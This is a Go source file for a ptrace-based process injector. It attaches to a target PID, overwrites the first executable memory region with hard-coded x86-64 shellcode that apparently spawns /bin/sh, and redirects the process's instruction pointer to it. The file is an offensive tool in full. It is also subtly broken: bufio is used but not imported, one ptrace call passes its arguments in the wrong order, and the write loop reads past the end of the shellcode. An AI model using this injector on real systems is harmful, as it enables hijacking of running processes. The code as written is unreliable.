package main

import (
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

const SHELLCODE = "\x31\xc0\x48\xbb\xd1\x9d\x96" +
	"\x91\xd0\x8c\x97\xff\x48\xf7" +
	"\xdb\x53\x54\x5f\x99\x52\x57" +
	"\x54\x5e\xb0\x3b\x0f\x05"

type userRegsStruct struct {
	R15, R14, R13, R12, R11, R10, R9, R8 uint64
	Rdi, Rsi, Rdx, Rcx, Rbx, Rax, Rbp, Rsp uint64
	Rip, Eflags, Cs, Ss, Ds, Es, Fs, Gs uint64
}

func inject(pid int) {
	var oldRegs userRegsStruct
	var address uintptr
	psize := len(SHELLCODE)

	if err := syscall.PtraceAttach(pid); err != nil {
		fmt.Println("Failed to attach to process:", err)
		os.Exit(1)
	}
	defer syscall.PtraceDetach(pid)

	syscall.Wait4(pid, nil, 0, nil)

	if _, _, errno := syscall.Syscall(syscall.SYS_PTRACE, syscall.PTRACE_GETREGS, uintptr(pid), uintptr(unsafe.Pointer(&oldRegs))); errno != 0 {
		fmt.Println("Failed to get state from registers:", errno)
		os.Exit(1)
	}

	mapsFile := fmt.Sprintf("/proc/%d/maps", pid)
	fileMaps, err := os.Open(mapsFile)
	if err != nil {
		fmt.Println("Failed to open maps file:", err)
		os.Exit(1)
	}
	defer fileMaps.Close()

	var line string
	var found bool
	scanner := bufio.NewScanner(fileMaps)
	for scanner.Scan() {
		line = scanner.Text()
		if strings.Contains(line, "r-xp") {
			parts := strings.Split(line, "-")
			address, _ = strconv.ParseUint(parts[0], 16, 64)
			found = true
			break
		}
	}
	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading maps file:", err)
		os.Exit(1)
	}

	if !found {
		fmt.Println("Failed to find a suitable memory region for injection.")
		os.Exit(1)
	}

	for i := 0; i < psize; i += 8 {
		value := *(*uint64)(unsafe.Pointer(&SHELLCODE[i]))
		if _, _, errno := syscall.Syscall(syscall.SYS_PTRACE, syscall.PTRACE_POKEDATA, uintptr(pid), address+uintptr(i), uintptr(value)); errno != 0 {
			fmt.Println("Failed to write data to process memory:", errno)
			os.Exit(1)
		}
	}

	oldRegs.Rip = address
	if _, _, errno := syscall.Syscall(syscall.SYS_PTRACE, syscall.PTRACE_SETREGS, uintptr(pid), 0, uintptr(unsafe.Pointer(&oldRegs))); errno != 0 {
		fmt.Println("Failed to set registers state:", errno)
		os.Exit(1)
	}

	fmt.Println("[*] SUCCESSFULLY! Injected!! [*]")
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Use: <pid>")
		os.Exit(1)
	}

	pid, err := strconv.Atoi(os.Args[1])
	if err != nil {
		fmt.Println("Invalid PID:", err)
		os.Exit(1)
	}
	inject(pid)
}

